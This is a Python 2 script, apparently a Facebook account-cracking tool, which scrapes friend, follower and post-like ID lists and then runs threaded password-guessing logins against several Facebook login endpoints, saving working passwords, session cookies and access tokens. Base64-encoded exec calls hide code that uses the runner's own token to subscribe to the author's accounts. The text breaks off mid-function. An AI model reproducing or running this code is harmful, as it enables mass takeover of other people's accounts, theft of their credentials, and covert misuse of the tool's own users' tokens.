#!/usr/bin/python2
# coding=utf-8
# coding by AKASH VAU
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Mr Akash Vau
 - facebook    : facebook.com/Thanda.Babaa
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +8801401-127470
 - github      : github.com/Fuck-Fuck!
 - script name : Unknown (Facebook Bangladesh )
 - version     : 1.1
 
%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))
ok, cp, id, user, loop = [], [], [], [], 0
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s Paste Token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print (''' %s 
 TEAM@ EXPERT-ZONE%s \n This Tools is Only For Educational Purposes \n Do Not Use For Illigal Purposes%s> %sAKASH \n We Are Trying To Play Against System%s> %sAKASH\n Stay With Us%s>%s Facebook \n Thank You %s>%sWorld\n %s[%s*%s] By : %sAKASH VAU \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
 (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
# SASI TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s [01] Login via Token \n [02] Log out Token \n [%s00%s] Back'%(P,M,P))
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] Brother Paste Token Again "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] We are trying to teach you about system"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(P,K))
        if romz in(""):
        	print("%s [!] Brother Paste Token Again "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login Success, Enjoy '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes Dump id %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] Dump File :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        batas = raw_input(' %s[*] Limit id : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes Dump id %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] Dump File :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
        idt = raw_input(' [*] Id post   : %s'%(K))
        simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes Dump id '%(P,H,P))
        print ('%s [%s√%s] Dump File :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] File dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] Total id : %s%s' %(P,K,P,H,len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
        unikers = raw_input('%s [?] Do you want to choose password manual? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] Method : %s'%(P,K))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] AKASH %sON %sResult save to >%s AKASH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AKASH %sOFF %sResult save to > %s AKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s*%s] AKASH %sON %sResult save to >%s AKASH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AKASH %sOFF %sResult save to > %s AKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] AKASH %sON%sResult save to >%s AKADH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AKASH %sOFF %sResult save to > %sAKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] Brother Try Again'%(M));zona()
                    print '\n%s [ Fill Methode Crack - silahkan coba satu² ]\n'%(P)
                    print ' [%s01%s] B-API Method (AKASH-PRO)'%(K,P)
                    print ' [%s02%s] Method M-Basic (FAST CRACK)'%(K,P)
                    print ' [%s03%s] Method Fb-Lite (SLOW CRACK)'%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
            print ' [%s01%s] B-API Method (AKASH-PRO)'%(K,P)
            print ' [%s02%s] Method M-Basic (FAST CRACK)'%(K,P)
            print ' [%s03%s] Methode Fb-Lite (SLOW CRACK)'%(K,P)
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] Methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] AKASH %sON%sResult save to >%s AKASH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] AKASH %sOFF %sResult save to > %s AKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] AKASH %sON%sResult save to >%s AKASH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] AKASH %sOFF %Result save to > %s AKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s*%s] AKASH %sON%sResult save to >%s AKASH/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] AKASH %sOFF %sResult save to > %s AKASH/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s [!] Brother Paste Token Again "%(M));self.langsung()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %sAKASH-OFF %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sAKASH-OFF %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sAKASH-OFF %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sCracking %s/%s [ON-:%s]-[OFF-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sAKASH-OFF %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sAKASH-OFF %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sAKASH-OFF %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sCracking %s/%s [ON-:%s]-[OFF-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
